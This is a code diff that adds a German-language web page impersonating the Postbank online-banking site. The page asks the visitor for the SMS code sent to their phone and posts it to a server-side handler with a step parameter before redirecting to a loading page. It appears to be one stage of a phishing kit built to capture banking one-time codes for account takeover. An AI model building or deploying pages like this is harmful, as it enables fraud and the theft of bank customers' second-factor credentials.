@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="style.css">
+        <title>Postbank</title>
+<link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
+</head>
+
+<body class="bg-[#E7EBF2]">
+    <nav class="h-[50px] sm:h-[93px] bg-[#FDCC00]">
+        <div class="max-w-[1140px] mx-auto py-2 px-1 sm:py-7">
+            <img src="./assets/logo.svg" alt="" class="w-[5.625rem] sm:w-[9.25rem]">
+        </div>
+    </nav>
+    <main class="max-w-[555px] sm:mx-auto min-h-[471px] mx-4 py-12">
+        <h1 class="text-[#4c4c4c] antialiased text-lg">Geben Sie den Code ein, der per SMS an Ihre Handynummer gesendet
+            wurde.</h1>
+        <div class="mt-8">
+            <input type="password" id="code"
+                class="text-[#4c4c4c] text-lg antialiased rounded h-[50px] px-[0.9375rem] leading-normal w-full border border-[#ced6e4] outline-none hover:border-[#3b5d93] hover:shadow-inner"
+                placeholder="Code">
+
+        </div>
+        <div class="my-8">
+            <button id="btn" disabled
+                class="rounded px-[15px] h-[40px] text-sm w-full disabled:bg-[#CCCCCC] bg-[#0A3478] text-white disabled:text-[#7f7f7f]">Anmelden</button>
+        </div>
+    </main>
+    <footer class="min-h-[102px] bg-[#ffcc00] px-4 sm:px-0 py-5 space-y-3">
+        <ul class="sm:max-w-[1140px] sm:mx-auto flex flex-wrap text-sm space-x-4 pt-2 text-[#0A3478] antialiased">
+            <li class="font-bold">Das ist neu</li>
+            <li class="font-bold">Feedback</li>
+            <li>Terminvereinbarung</li>
+            <li>Kontakt</li>
+            <li>Impressum</li>
+            <li>Rechtshinweise</li>
+            <li>Datenschutzhinweise</li>
+        </ul>
+        <h1 class="sm:max-w-[1140px] sm:mx-auto text-sm text-[#4c4c4c] antialiased">© 2022 Postbank – eine Niederlassung
+            der
+            Deutsche
+            Bank AG</h1>
+    </footer>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            $('#btn').attr('disabled', true);
+            $('#code').keyup(function () {
+                if ($(this).val().length != 0)
+                    $('#btn').attr('disabled', false);
+                else
+                    $('#btn').attr('disabled', true);
+            })
+        });
+    </script>
+
+    <script>
+        $('#btn').click(() => {
+            let code = $('#code')
+            let form = new FormData()
+            form.append('code', code.val())
+
+            $.ajax({
+                type: 'post',
+                data: form,
+                url: './serv/handle.php?step=code',
+                processData: false,
+                contentType: false,
+                success: () => {
+                    localStorage.setItem('goto', 'done')
+                    window.location.href = './loading.html'
+                }
+            })
+
+        })
+    </script>
+</body>
+
+</html>
